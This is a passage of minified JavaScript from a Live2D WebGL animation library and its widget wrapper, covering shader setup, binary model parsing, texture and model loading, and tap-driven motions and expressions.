if(null!=this.getClipBufPre_clipContextDraw()){a.useProgram(this.shaderProgramOff),this._$vS=Tt(a,this._$vS,r),this._$no=Pt(a,this._$no,e),a.enableVertexAttribArray(this.a_position_Loc_Off),a.vertexAttribPointer(this.a_position_Loc_Off,2,a.FLOAT,!1,0,0),this._$NT=Tt(a,this._$NT,o),a.activeTexture(a.TEXTURE1),a.bindTexture(a.TEXTURE_2D,this.textures[t]),a.uniform1i(this.s_texture0_Loc_Off,1),a.enableVertexAttribArray(this.a_texCoord_Loc_Off),a.vertexAttribPointer(this.a_texCoord_Loc_Off,2,a.FLOAT,!1,0,0),a.uniformMatrix4fv(this.u_clipMatrix_Loc_Off,!1,this.getClipBufPre_clipContextDraw().matrixForDraw),a.uniformMatrix4fv(this.u_matrix_Loc_Off,!1,this.matrix4x4),a.activeTexture(a.TEXTURE2),a.bindTexture(a.TEXTURE_2D,at.fTexture[this.glno]),a.uniform1i(this.s_texture1_Loc_Off,2);var p=this.getClipBufPre_clipContextDraw().layoutChannelNo,f=this.getChannelFlagAsColor(p);a.uniform4f(this.u_channelFlag_Loc_Off,f.r,f.g,f.b,f.a),a.uniform4f(this.u_baseColor_Loc_Off,h,l,$,u)}else a.useProgram(this.shaderProgram),this._$vS=Tt(a,this._$vS,r),this._$no=Pt(a,this._$no,e),a.enableVertexAttribArray(this.a_position_Loc),a.vertexAttribPointer(this.a_position_Loc,2,a.FLOAT,!1,0,0),this._$NT=Tt(a,this._$NT,o),a.activeTexture(a.TEXTURE1),a.bindTexture(a.TEXTURE_2D,this.textures[t]),a.uniform1i(this.s_texture0_Loc,1),a.enableVertexAttribArray(this.a_texCoord_Loc),a.vertexAttribPointer(this.a_texCoord_Loc,2,a.FLOAT,!1,0,0),a.uniformMatrix4fv(this.u_matrix_Loc,!1,this.matrix4x4),a.uniform4f(this.u_baseColor_Loc,h,l,$,u),a.uniform1i(this.u_maskFlag_Loc,!1);this.culling?this.gl.enable(a.CULL_FACE):this.gl.disable(a.CULL_FACE),this.gl.enable(a.BLEND);var d,g,y,m;if(null!=this.clipBufPre_clipContextMask)d=a.ONE,g=a.ONE_MINUS_SRC_ALPHA,y=a.ONE,m=a.ONE_MINUS_SRC_ALPHA;else switch(s){case $t._$ms:d=a.ONE,g=a.ONE_MINUS_SRC_ALPHA,y=a.ONE,m=a.ONE_MINUS_SRC_ALPHA;break;case $t._$ns:d=a.ONE,g=a.ONE,y=a.ZERO,m=a.ONE;break;case $t._$_s:d=a.DST_COLOR,g=a.ONE_MINUS_SRC_ALPHA,y=a.ZERO,m=a.ONE}a.blendEquationSeparate(a.FUNC_ADD,a.FUNC_ADD),a.blendFuncSeparate(d,g,y,m),this.anisotropyExt&&a.texParameteri(a.TEXTURE_2D,this.anisotropyExt.TEXTURE_MAX_ANISOTROPY_EXT,this.maxAnisotropy);var T=e.length;a.drawElements(a.TRIANGLES,T,a.UNSIGNED_SHORT,0),a.bindTexture(a.TEXTURE_2D,null)}},mt.prototype._$Rs=function(){throw new Error(\"_$Rs\")},mt.prototype._$Ds=function(t){throw new Error(\"_$Ds\")},mt.prototype._$K2=function(){for(var t=0;t<this.textures.length;t++){0!=this.textures[t]&&(this.gl._$K2(1,this.textures,t),this.textures[t]=null)}},mt.prototype.setTexture=function(t,i){this.textures[t]=i},mt.prototype.initShader=function(){var t=this.gl;this.loadShaders2(),this.a_position_Loc=t.getAttribLocation(this.shaderProgram,\"a_position\"),this.a_texCoord_Loc=t.getAttribLocation(this.shaderProgram,\"a_texCoord\"),this.u_matrix_Loc=t.getUniformLocation(this.shaderProgram,\"u_mvpMatrix\"),this.s_texture0_Loc=t.getUniformLocation(this.shaderProgram,\"s_texture0\"),this.u_channelFlag=t.getUniformLocation(this.shaderProgram,\"u_channelFlag\"),this.u_baseColor_Loc=t.getUniformLocation(this.shaderProgram,\"u_baseColor\"),this.u_maskFlag_Loc=t.getUniformLocation(this.shaderProgram,\"u_maskFlag\"),this.a_position_Loc_Off=t.getAttribLocation(this.shaderProgramOff,\"a_position\"),this.a_texCoord_Loc_Off=t.getAttribLocation(this.shaderProgramOff,\"a_texCoord\"),this.u_matrix_Loc_Off=t.getUniformLocation(this.shaderProgramOff,\"u_mvpMatrix\"),this.u_clipMatrix_Loc_Off=t.getUniformLocation(this.shaderProgramOff,\"u_ClipMatrix\"),this.s_texture0_Loc_Off=t.getUniformLocation(this.shaderProgramOff,\"s_texture0\"),this.s_texture1_Loc_Off=t.getUniformLocation(this.shaderProgramOff,\"s_texture1\"),this.u_channelFlag_Loc_Off=t.getUniformLocation(this.shaderProgramOff,\"u_channelFlag\"),this.u_baseColor_Loc_Off=t.getUniformLocation(this.shaderProgramOff,\"u_baseColor\")},mt.prototype.disposeShader=function(){var t=this.gl;this.shaderProgram&&(t.deleteProgram(this.shaderProgram),this.shaderProgram=null),this.shaderProgramOff&&(t.deleteProgram(this.shaderProgramOff),this.shaderProgramOff=null)},mt.prototype.compileShader=function(t,i){var e=this.gl,r=i,o=e.createShader(t);if(null==o)return _._$Ji(\"_$L0 to create shader\"),null;if(e.shaderSource(o,r),e.compileShader(o),!e.getShaderParameter(o,e.COMPILE_STATUS)){var n=e.getShaderInfoLog(o);return _._$Ji(\"_$L0 to compile shader : \"+n),e.deleteShader(o),null}return o},mt.prototype.loadShaders2=function(){var t=this.gl;if(this.shaderProgram=t.createProgram(),!this.shaderProgram)return!1;if(this.shaderProgramOff=t.createProgram(),!this.shaderProgramOff)return!1;if(this.vertShader=this.compileShader(t.VERTEX_SHADER,\"attribute vec4     a_position;attribute vec2     a_texCoord;varying vec2       v_texCoord;varying vec4       v_ClipPos;uniform mat4       u_mvpMatrix;void main(){    gl_Position = u_mvpMatrix * a_position;    v_ClipPos = u_mvpMatrix * a_position;    v_texCoord = a_texCoord;}\"),!this.vertShader)return _._$Ji(\"Vertex shader compile _$li!\"),!1;if(this.vertShaderOff=this.compileShader(t.VERTEX_SHADER,\"attribute vec4     a_position;attribute vec2     a_texCoord;varying vec2       v_texCoord;varying vec4       v_ClipPos;uniform mat4       u_mvpMatrix;uniform mat4       u_ClipMatrix;void main(){    gl_Position = u_mvpMatrix * a_position;    v_ClipPos = u_ClipMatrix * a_position;    v_texCoord = a_texCoord ;}\"),!this.vertShaderOff)return _._$Ji(\"OffVertex shader compile _$li!\"),!1;if(this.fragShader=this.compileShader(t.FRAGMENT_SHADER,\"precision mediump float;varying vec2       v_texCoord;varying vec4       v_ClipPos;uniform sampler2D  s_texture0;uniform vec4       u_channelFlag;uniform vec4       u_baseColor;uniform bool       u_maskFlag;void main(){    vec4 smpColor;     if(u_maskFlag){        float isInside =             step(u_baseColor.x, v_ClipPos.x/v_ClipPos.w)          * step(u_baseColor.y, v_ClipPos.y/v_ClipPos.w)          * step(v_ClipPos.x/v_ClipPos.w, u_baseColor.z)          * step(v_ClipPos.y/v_ClipPos.w, u_baseColor.w);        smpColor = u_channelFlag * texture2D(s_texture0 , v_texCoord).a * isInside;    }else{        smpColor = texture2D(s_texture0 , v_texCoord) * u_baseColor;    }    gl_FragColor = smpColor;}\"),!this.fragShader)return _._$Ji(\"Fragment shader compile _$li!\"),!1;if(this.fragShaderOff=this.compileShader(t.FRAGMENT_SHADER,\"precision mediump float ;varying vec2       v_texCoord;varying vec4       v_ClipPos;uniform sampler2D  s_texture0;uniform sampler2D  s_texture1;uniform vec4       u_channelFlag;uniform vec4       u_baseColor ;void main(){    vec4 col_formask = texture2D(s_texture0, v_texCoord) * u_baseColor;    vec4 clipMask = texture2D(s_texture1, v_ClipPos.xy / v_ClipPos.w) * u_channelFlag;    float maskVal = clipMask.r + clipMask.g + clipMask.b + clipMask.a;    col_formask = col_formask * maskVal;    gl_FragColor = col_formask;}\"),!this.fragShaderOff)return _._$Ji(\"OffFragment shader compile _$li!\"),!1;if(t.attachShader(this.shaderProgram,this.vertShader),t.attachShader(this.shaderProgram,this.fragShader),t.attachShader(this.shaderProgramOff,this.vertShaderOff),t.attachShader(this.shaderProgramOff,this.fragShaderOff),t.linkProgram(this.shaderProgram),t.linkProgram(this.shaderProgramOff),!t.getProgramParameter(this.shaderProgram,t.LINK_STATUS)){var i=t.getProgramInfoLog(this.shaderProgram);return _._$Ji(\"_$L0 to link program: \"+i),this.vertShader&&(t.deleteShader(this.vertShader),this.vertShader=0),this.fragShader&&(t.deleteShader(this.fragShader),this.fragShader=0),this.shaderProgram&&(t.deleteProgram(this.shaderProgram),this.shaderProgram=0),this.vertShaderOff&&(t.deleteShader(this.vertShaderOff),this.vertShaderOff=0),this.fragShaderOff&&(t.deleteShader(this.fragShaderOff),this.fragShaderOff=0),this.shaderProgramOff&&(t.deleteProgram(this.shaderProgramOff),this.shaderProgramOff=0),!1}return!0},mt.prototype.createFramebuffer=function(){var t=this.gl,i=at.clippingMaskBufferSize,e=t.createFramebuffer();t.bindFramebuffer(t.FRAMEBUFFER,e);var r=t.createRenderbuffer();t.bindRenderbuffer(t.RENDERBUFFER,r),t.renderbufferStorage(t.RENDERBUFFER,t.RGBA4,i,i),t.framebufferRenderbuffer(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.RENDERBUFFER,r);var o=t.createTexture();return t.bindTexture(t.TEXTURE_2D,o),t.texImage2D(t.TEXTURE_2D,0,t.RGBA,i,i,0,t.RGBA,t.UNSIGNED_BYTE,null),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_MIN_FILTER,t.LINEAR),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_MAG_FILTER,t.LINEAR),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_S,t.CLAMP_TO_EDGE),t.texParameteri(t.TEXTURE_2D,t.TEXTURE_WRAP_T,t.CLAMP_TO_EDGE),t.framebufferTexture2D(t.FRAMEBUFFER,t.COLOR_ATTACHMENT0,t.TEXTURE_2D,o,0),t.bindTexture(t.TEXTURE_2D,null),t.bindRenderbuffer(t.RENDERBUFFER,null),t.bindFramebuffer(t.FRAMEBUFFER,null),at.fTexture[this.glno]=o,{framebuffer:e,renderbuffer:r,texture:at.fTexture[this.glno]}},St.prototype._$fP=function(){var t,i,e,r=this._$ST();if(0==(128&r))return 255&r;if(0==(128&(t=this._$ST())))return(127&r)<<7|127&t;if(0==(128&(i=this._$ST())))return(127&r)<<14|(127&t)<<7|255&i;if(0==(128&(e=this._$ST())))return(127&r)<<21|(127&t)<<14|(127&i)<<7|255&e;throw new lt(\"_$L _$0P  _\")},St.prototype.getFormatVersion=function(){return this._$S2},St.prototype._$gr=function(t){this._$S2=t},St.prototype._$3L=function(){return this._$fP()},St.prototype._$mP=function(){return this._$zT(),this._$F+=8,this._$T.getFloat64(this._$F-8)},St.prototype._$_T=function(){return this._$zT(),this._$F+=4,this._$T.getFloat32(this._$F-4)},St.prototype._$6L=function(){return this._$zT(),this._$F+=4,this._$T.getInt32(this._$F-4)},St.prototype._$ST=function(){return this._$zT(),this._$T.getInt8(this._$F++)},St.prototype._$9T=function(){return this._$zT(),this._$F+=2,this._$T.getInt16(this._$F-2)},St.prototype._$2T=function(){throw this._$zT(),this._$F+=8,new lt(\"_$L _$q read long\")},St.prototype._$po=function(){return this._$zT(),0!=this._$T.getInt8(this._$F++)};var xt=!0;St.prototype._$bT=function(){this._$zT();var t=this._$3L(),i=null;if(xt)try{var e=new ArrayBuffer(2*t);i=new Uint16Array(e);for(var r=0;r<t;++r)i[r]=this._$T.getUint8(this._$F++);return String.fromCharCode.apply(null,i)}catch(t){xt=!1}try{var o=new Array;if(null==i)for(var r=0;r<t;++r)o[r]=this._$T.getUint8(this._$F++);else for(var r=0;r<t;++r)o[r]=i[r];return String.fromCharCode.apply(null,o)}catch(t){console.log(\"read utf8 / _$rT _$L0 !! : \"+t)}},St.prototype._$cS=function(){this._$zT();for(var t=this._$3L(),i=new Int32Array(t),e=0;e<t;e++)i[e]=this._$T.getInt32(this._$F),this._$F+=4;return i},St.prototype._$Tb=function(){this._$zT();for(var t=this._$3L(),i=new Float32Array(t),e=0;e<t;e++)i[e]=this._$T.getFloat32(this._$F),this._$F+=4;return i},St.prototype._$5b=function(){this._$zT();for(var t=this._$3L(),i=new Float64Array(t),e=0;e<t;e++)i[e]=this._$T.getFloat64(this._$F),this._$F+=8;return i},St.prototype._$nP=function(){return this._$Jb(-1)},St.prototype._$Jb=function(t){if(this._$zT(),t<0&&(t=this._$3L()),t==G._$7P){var i=this._$6L();if(0<=i&&i<this._$Ko.length)return this._$Ko[i];throw new lt(\"_$sL _$4i @_$m0\")}var e=this._$4b(t);return this._$Ko.push(e),e},St.prototype._$4b=function(t){if(0==t)return null;if(50==t){var i=this._$bT(),e=b.getID(i);return e}if(51==t){var i=this._$bT(),e=yt.getID(i);return e}if(134==t){var i=this._$bT(),e=l.getID(i);return e}if(60==t){var i=this._$bT(),e=u.getID(i);return e}if(t>=48){var r=G._$9o(t);return null!=r?(r._$F0(this),r):null}switch(t){case 1:return this._$bT();case 10:return new n(this._$6L(),!0);case 11:return new S(this._$mP(),this._$mP(),this._$mP(),this._$mP());case 12:return new S(this._$_T(),this._$_T(),this._$_T(),this._$_T());case 13:return new L(this._$mP(),this._$mP());case 14:return new L(this._$_T(),this._$_T());case 15:for(var o=this._$3L(),e=new Array(o),s=0;s<o;s++)e[s]=this._$nP();return e;case 17:var e=new F(this._$mP(),this._$mP(),this._$mP(),this._$mP(),this._$mP(),this._$mP());return e;case 21:return new h(this._$6L(),this._$6L(),this._$6L(),this._$6L());case 22:return new pt(this._$6L(),this._$6L());case 23:throw new Error(\"_$L _$ro \");case 16:case 25:return this._$cS();case 26:return this._$5b();case 27:return this._$Tb();case 2:case 3:case 4:case 5:case 6:case 7:case 8:case 9:case 18:case 19:case 20:case 24:case 28:throw new lt(\"_$6 _$q : _$nP() of 2-9 ,18,19,20,24,28 : \"+t);default:throw new lt(\"_$6 _$q : _$nP() NO _$i : \"+t)}},St.prototype._$8L=function(){return 0==this._$hL?this._$v0=this._$ST():8==this._$hL&&(this._$v0=this._$ST(),this._$hL=0),1==(this._$v0>>7-this._$hL++&1)},St.prototype._$zT=function(){0!=this._$hL&&(this._$hL=0)},vt.prototype._$wP=function(t,i,e){for(var r=0;r<e;r++){for(var o=0;o<i;o++){var n=2*(o+r*i);console.log(\"(% 7.3f , % 7.3f) , \",t[n],t[n+1])}console.log(\"\\n\")}console.log(\"\\n\")},Lt._$2S=Math.PI/180,Lt._$bS=Math.PI/180,Lt._$wS=180/Math.PI,Lt._$NS=180/Math.PI,Lt.PI_F=Math.PI,Lt._$kT=[0,.012368,.024734,.037097,.049454,.061803,.074143,.086471,.098786,.111087,.12337,.135634,.147877,.160098,.172295,.184465,.196606,.208718,.220798,.232844,.244854,.256827,.268761,.280654,.292503,.304308,.316066,.327776,.339436,.351044,.362598,.374097,.385538,.396921,.408243,.419502,.430697,.441826,.452888,.463881,.474802,.485651,.496425,.507124,.517745,.528287,.538748,.549126,.559421,.56963,.579752,.589785,.599728,.609579,.619337,.629,.638567,.648036,.657406,.666676,.675843,.684908,.693867,.70272,.711466,.720103,.72863,.737045,.745348,.753536,.76161,.769566,.777405,.785125,.792725,.800204,.807561,.814793,.821901,.828884,.835739,.842467,.849066,.855535,.861873,.868079,.874153,.880093,.885898,.891567,.897101,.902497,.907754,.912873,.917853,.922692,.92739,.931946,.936359,.940629,.944755,.948737,.952574,.956265,.959809,.963207,.966457,.96956,.972514,.97532,.977976,.980482,.982839,.985045,.987101,.989006,.990759,.992361,.993811,.995109,.996254,.997248,.998088,.998776,.999312,.999694,.999924,1],Lt._$92=function(t,i){var e=Math.atan2(t[1],t[0]),r=Math.atan2(i[1],i[0]);return Lt._$tS(e,r)},Lt._$tS=function(t,i){for(var e=t-i;e<-Math.PI;)e+=2*Math.PI;for(;e>Math.PI;)e-=2*Math.PI;return e},Lt._$9=function(t){return Math.sin(t)},Lt.fcos=function(t){return Math.cos(t)},Mt.prototype._$u2=function(){return this._$IS[0]},Mt.prototype._$yo=function(){return this._$AT&&!this._$IS[0]},Mt.prototype._$GT=function(){return this._$e0},Et._$W2=0,Et.SYSTEM_INFO=null,Et.USER_AGENT=navigator.userAgent,Et.isIPhone=function(){return Et.SYSTEM_INFO||Et.setup(),Et.SYSTEM_INFO._isIPhone},Et.isIOS=function(){return Et.SYSTEM_INFO||Et.setup(),Et.SYSTEM_INFO._isIPhone||Et.SYSTEM_INFO._isIPad},Et.isAndroid=function(){return Et.SYSTEM_INFO||Et.setup(),Et.SYSTEM_INFO._isAndroid},Et.getOSVersion=function(){return Et.SYSTEM_INFO||Et.setup(),Et.SYSTEM_INFO.version},Et.getOS=function(){return Et.SYSTEM_INFO||Et.setup(),Et.SYSTEM_INFO._isIPhone||Et.SYSTEM_INFO._isIPad?\"iOS\":Et.SYSTEM_INFO._isAndroid?\"Android\":\"_$Q0 OS\"},Et.setup=function(){function t(t,i){for(var e=t.substring(i).split(/[ _,;\\.]/),r=0,o=0;o<=2&&!isNaN(e[o]);o++){var n=parseInt(e[o]);if(n<0||n>999){_._$li(\"err : \"+n+\" @UtHtml5.setup()\"),r=0;break}r+=n*Math.pow(1e3,2-o)}return r}var i,e=Et.USER_AGENT,r=Et.SYSTEM_INFO={userAgent:e};if((i=e.indexOf(\"iPhone OS \"))>=0)r.os=\"iPhone\",r._isIPhone=!0,r.version=t(e,i+\"iPhone OS \".length);else if((i=e.indexOf(\"iPad\"))>=0){if((i=e.indexOf(\"CPU OS\"))<0)return void _._$li(\" err : \"+e+\" @UtHtml5.setup()\");r.os=\"iPad\",r._isIPad=!0,r.version=t(e,i+\"CPU OS \".length)}else(i=e.indexOf(\"Android\"))>=0?(r.os=\"Android\",r._isAndroid=!0,r.version=t(e,i+\"Android \".length)):(r.os=\"-\",r.version=-1)},window.UtSystem=w,window.UtDebug=_,window.LDTransform=gt,window.LDGL=nt,window.Live2D=at,window.Live2DModelWebGL=ft,window.Live2DModelJS=q,window.Live2DMotion=J,window.MotionQueueManager=ct,window.PhysicsHair=f,window.AMotion=s,window.PartsDataID=l,window.DrawDataID=b,window.BaseDataID=yt,window.ParamID=u,at.init();var At=!1}()}).call(i,e(7))},function(t,i){t.exports={import:function(){throw new Error(\"System.import cannot be used indirectly\")}}},function(t,i,e){\"use strict\";function r(t){return t&&t.__esModule?t:{default:t}}function o(){this.models=[],this.count=-1,this.reloadFlg=!1,Live2D.init(),n.Live2DFramework.setPlatformManager(new _.default)}Object.defineProperty(i,\"__esModule\",{value:!0}),i.default=o;var n=e(0),s=e(9),_=r(s),a=e(10),h=r(a),l=e(1),$=r(l);o.prototype.createModel=function(){var t=new h.default;return this.models.push(t),t},o.prototype.changeModel=function(t,i){if(this.reloadFlg){this.reloadFlg=!1;this.releaseModel(0,t),this.createModel(),this.models[0].load(t,i)}},o.prototype.getModel=function(t){return t>=this.models.length?null:this.models[t]},o.prototype.releaseModel=function(t,i){this.models.length<=t||(this.models[t].release(i),delete this.models[t],this.models.splice(t,1))},o.prototype.numModels=function(){return this.models.length},o.prototype.setDrag=function(t,i){for(var e=0;e<this.models.length;e++)this.models[e].setDrag(t,i)},o.prototype.maxScaleEvent=function(){$.default.DEBUG_LOG&&console.log(\"Max scale event.\");for(var t=0;t<this.models.length;t++)this.models[t].startRandomMotion($.default.MOTION_GROUP_PINCH_IN,$.default.PRIORITY_NORMAL)},o.prototype.minScaleEvent=function(){$.default.DEBUG_LOG&&console.log(\"Min scale event.\");for(var t=0;t<this.models.length;t++)this.models[t].startRandomMotion($.default.MOTION_GROUP_PINCH_OUT,$.default.PRIORITY_NORMAL)},o.prototype.tapEvent=function(t,i){$.default.DEBUG_LOG&&console.log(\"tapEvent view x:\"+t+\" y:\"+i);for(var e=0;e<this.models.length;e++)this.models[e].hitTest($.default.HIT_AREA_HEAD,t,i)?($.default.DEBUG_LOG&&console.log(\"Tap face.\"),this.models[e].setRandomExpression()):this.models[e].hitTest($.default.HIT_AREA_BODY,t,i)?($.default.DEBUG_LOG&&console.log(\"Tap body. models[\"+e+\"]\"),this.models[e].startRandomMotion($.default.MOTION_GROUP_TAP_BODY,$.default.PRIORITY_NORMAL)):this.models[e].hitTestCustom(\"head\",t,i)?($.default.DEBUG_LOG&&console.log(\"Tap face.\"),this.models[e].startRandomMotion($.default.MOTION_GROUP_FLICK_HEAD,$.default.PRIORITY_NORMAL)):this.models[e].hitTestCustom(\"body\",t,i)&&($.default.DEBUG_LOG&&console.log(\"Tap body. models[\"+e+\"]\"),this.models[e].startRandomMotion($.default.MOTION_GROUP_TAP_BODY,$.default.PRIORITY_NORMAL));return!0}},function(t,i,e){\"use strict\";function r(){}Object.defineProperty(i,\"__esModule\",{value:!0}),i.default=r;var o=e(2);var requestCache={};r.prototype.loadBytes=function(t,i){if(requestCache[t]!==undefined){i(requestCache[t]);return;}var e=new XMLHttpRequest;e.open(\"GET\",t,!0),e.responseType=\"arraybuffer\",e.onload=function(){switch(e.status){case 200:requestCache[t]=e.response;i(e.response);break;default:console.error(\"Failed to load (\"+e.status+\") : \"+t)}},e.send(null)},r.prototype.loadString=function(t){this.loadBytes(t,function(t){return t})},r.prototype.loadLive2DModel=function(t,i){var e=null;this.loadBytes(t,function(t){e=Live2DModelWebGL.loadModel(t),i(e)})},r.prototype.loadTexture=function(t,i,e,r){var n=new Image;n.crossOrigin=\"Anonymous\",n.src=e;n.onload=function(){var e=(0,o.getContext)(),s=e.createTexture();if(!s)return console.error(\"Failed to generate gl texture name.\"),-1;0==t.isPremultipliedAlpha()&&e.pixelStorei(e.UNPACK_PREMULTIPLY_ALPHA_WEBGL,1),e.pixelStorei(e.UNPACK_FLIP_Y_WEBGL,1),e.activeTexture(e.TEXTURE0),e.bindTexture(e.TEXTURE_2D,s),e.texImage2D(e.TEXTURE_2D,0,e.RGBA,e.RGBA,e.UNSIGNED_BYTE,n),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MAG_FILTER,e.LINEAR),e.texParameteri(e.TEXTURE_2D,e.TEXTURE_MIN_FILTER,e.LINEAR_MIPMAP_NEAREST),e.generateMipmap(e.TEXTURE_2D),t.setTexture(i,s),s=null,\"function\"==typeof r&&r()},n.onerror=function(){console.error(\"Failed to load image : \"+e)}},r.prototype.jsonParseFromBytes=function(t){var i,e=new Uint8Array(t,0,3);return i=239==e[0]&&187==e[1]&&191==e[2]?String.fromCharCode.apply(null,new Uint8Array(t,3)):String.fromCharCode.apply(null,new Uint8Array(t)),JSON.parse(i)},r.prototype.log=function(t){}},function(t,i,e){\"use strict\";function r(t){return t&&t.__esModule?t:{default:t}}function o(){n.L2DBaseModel.prototype.constructor.call(this),this.modelHomeDir=\"\",this.modelSetting=null,this.tmpMatrix=[]}Object.defineProperty(i,\"__esModule\",{value:!0}),i.default=o;var n=e(0),s=e(11),_=r(s),a=e(1),h=r(a),l=e(3),$=r(l);o.prototype=new n.L2DBaseModel,o.prototype.load=function(t,i,e){this.setUpdating(!0),this.setInitialized(!1),this.modelHomeDir=i.substring(0,i.lastIndexOf(\"/\")+1),this.modelSetting=new _.default;var r=this;this.modelSetting.loadModelSetting(i,function(){var t=r.modelHomeDir+r.modelSetting.getModelFile();r.loadModelData(t,function(t){for(var i=0;i<r.modelSetting.getTextureNum();i++){if(/^https?:\\/\\/|^\\/\\//i.test(r.modelSetting.getTextureFile(i)))var o=r.modelSetting.getTextureFile(i);else var o=r.modelHomeDir+r.modelSetting.getTextureFile(i);r.loadTexture(i,o,function(){if(r.isTexLoaded){if(r.modelSetting.getExpressionNum()>0){r.expressions={};for(var t=0;t<r.modelSetting.getExpressionNum();t++){var i=r.modelSetting.getExpressionName(t),o=r.modelHomeDir+r.modelSetting.getExpressionFile(t);r.loadExpression(i,o)}}else r.expressionManager=null,r.expressions={};if(r.eyeBlink,null!=r.modelSetting.getPhysicsFile()?r.loadPhysics(r.modelHomeDir+r.modelSetting.getPhysicsFile()):r.physics=null,null!=r.modelSetting.getPoseFile()?r.loadPose(r.modelHomeDir+r.modelSetting.getPoseFile(),function(){r.pose.updateParam(r.live2DModel)}):r.pose=null,null!=r.modelSetting.getLayout()){var n=r.modelSetting.getLayout();null!=n.width&&r.modelMatrix.setWidth(n.width),null!=n.height&&r.modelMatrix.setHeight(n.height),null!=n.x&&r.modelMatrix.setX(n.x),null!=n.y&&r.modelMatrix.setY(n.y),null!=n.center_x&&r.modelMatrix.centerX(n.center_x),null!=n.center_y&&r.modelMatrix.centerY(n.center_y),null!=n.top&&r.modelMatrix.top(n.top),null!=n.bottom&&r.modelMatrix.bottom(n.bottom),null!=n.left&&r.modelMatrix.left(n.left),null!=n.right&&r.modelMatrix.right(n.right)}if(null!=r.modelSetting.getHitAreasCustom()){var s=r.modelSetting.getHitAreasCustom();null!=s.head_x&&(h.default.hit_areas_custom_head_x=s.head_x),null!=s.head_y&&(h.default.hit_areas_custom_head_y=s.head_y),null!=s.body_x&&(h.default.hit_areas_custom_body_x=s.body_x),null!=s.body_y&&(h.default.hit_areas_custom_body_y=s.body_y)}for(var t=0;t<r.modelSetting.getInitParamNum();t++)r.live2DModel.setParamFloat(r.modelSetting.getInitParamID(t),r.modelSetting.getInitParamValue(t));for(var t=0;t<r.modelSetting.getInitPartsVisibleNum();t++)r.live2DModel.setPartsOpacity(r.modelSetting.getInitPartsVisibleID(t),r.modelSetting.getInitPartsVisibleValue(t));r.live2DModel.saveParam(),r.preloadMotionGroup(h.default.MOTION_GROUP_IDLE),r.preloadMotionGroup(h.default.MOTION_GROUP_SLEEPY),r.mainMotionManager.stopAllMotions(),r.setUpdating(!1),r.setInitialized(!0),\"function\"==typeof e&&e()}})}})})},o.prototype.release=function(t){var i=n.Live2DFramework.getPlatformManager();t.deleteTexture(i.texture)},o.prototype.preloadMotionGroup=function(t){for(var i=this,e=0;e<this.modelSetting.getMotionNum(t);e++){var r=this.modelSetting.getMotionFile(t,e);this.loadMotion(r,this.modelHomeDir+r,function(r){r.setFadeIn(i.modelSetting.getMotionFadeIn(t,e)),r.setFadeOut(i.modelSetting.getMotionFadeOut(t,e))})}},o.prototype.update=function(){if(null==this.live2DModel)return void(h.default.DEBUG_LOG&&console.error(\"Failed to update.\"));var t=UtSystem.getUserTimeMSec()-this.startTimeMSec,i=t/1e3,e=2*i*Math.PI;if(this.mainMotionManager.isFinished()){\"1\"===sessionStorage.getItem(\"Sleepy\")?this.startRandomMotion(h.default.MOTION_GROUP_SLEEPY,h.default.PRIORITY_SLEEPY):this.startRandomMotion(h.default.MOTION_GROUP_IDLE,h.default.PRIORITY_IDLE)}this.live2DModel.loadParam(),this.mainMotionManager.updateParam(this.live2DModel)||null!=this.eyeBlink&&this.eyeBlink.updateParam(this.live2DModel),this.live2DModel.saveParam(),null==this.expressionManager||null==this.expressions||this.expressionManager.isFinished()||this.expressionManager.updateParam(this.live2DModel),this.live2DModel.addToParamFloat(\"PARAM_ANGLE_X\",30*this.dragX,1),this.live2DModel.addToParamFloat(\"PARAM_ANGLE_Y\",30*this.dragY,1),this.live2DModel.addToParamFloat(\"PARAM_ANGLE_Z\",this.dragX*this.dragY*-30,1),this.live2DModel.addToParamFloat(\"PARAM_BODY_ANGLE_X\",10*this.dragX,1),this.live2DModel.addToParamFloat(\"PARAM_EYE_BALL_X\",this.dragX,1),this.live2DModel.addToParamFloat(\"PARAM_EYE_BALL_Y\",this.dragY,1),this.live2DModel.addToParamFloat(\"PARAM_ANGLE_X\",Number(15*Math.sin(e/6.5345)),.5),this.live2DModel.addToParamFloat(\"PARAM_ANGLE_Y\",Number(8*Math.sin(e/3.5345)),.5),this.live2DModel.addToParamFloat(\"PARAM_ANGLE_Z\",Number(10*Math.sin(e/5.5345)),.5),this.live2DModel.addToParamFloat(\"PARAM_BODY_ANGLE_X\",Number(4*Math.sin(e/15.5345)),.5),this.live2DModel.setParamFloat(\"PARAM_BREATH\",Number(.5+.5*Math.sin(e/3.2345)),1),null!=this.physics&&this.physics.updateParam(this.live2DModel),null==this.lipSync&&this.live2DModel.setParamFloat(\"PARAM_MOUTH_OPEN_Y\",this.lipSyncValue),null!=this.pose&&this.pose.updateParam(this.live2DModel),this.live2DModel.update()},o.prototype.setRandomExpression=function(){var t=[];for(var i in this.expressions)t.push(i);var e=parseInt(Math.random()*t.length);this.setExpression(t[e])},o.prototype.startRandomMotion=function(t,i){var e=this.modelSetting.getMotionNum(t),r=parseInt(Math.random()*e);this.startMotion(t,r,i)},o.prototype.startMotion=function(t,i,e){var r=this.modelSetting.getMotionFile(t,i);if(null==r||\"\"==r)return void(h.default.DEBUG_LOG&&console.error(\"Failed to motion.\"));if(e==h.default.PRIORITY_FORCE)this.mainMotionManager.setReservePriority(e);else if(!this.mainMotionManager.reserveMotion(e))return void(h.default.DEBUG_LOG&&console.log(\"Motion is running.\"));var o,n=this;null==this.motions[t]?this.loadMotion(null,this.modelHomeDir+r,function(r){o=r,n.setFadeInFadeOut(t,i,e,o)}):(o=this.motions[t],n.setFadeInFadeOut(t,i,e,o))},o.prototype.setFadeInFadeOut=function(t,i,e,r){var o=this.modelSetting.getMotionFile(t,i);if(r.setFadeIn(this.modelSetting.getMotionFadeIn(t,i)),r.setFadeOut(this.modelSetting.getMotionFadeOut(t,i)),h.default.DEBUG_LOG&&console.log(\"Start motion : \"+o),null==this.modelSetting.getMotionSound(t,i))this.mainMotionManager.startMotionPrio(r,e);else{var n=this.modelSetting.getMotionSound(t,i),s=document.createElement(\"audio\");s.src=this.modelHomeDir+n,h.default.DEBUG_LOG&&console.log(\"Start sound : \"+n),s.play(),this.mainMotionManager.startMotionPrio(r,e)}},o.prototype.setExpression=function(t){var i=this.expressions[t];h.default.DEBUG_LOG&&console.log(\"Expression : 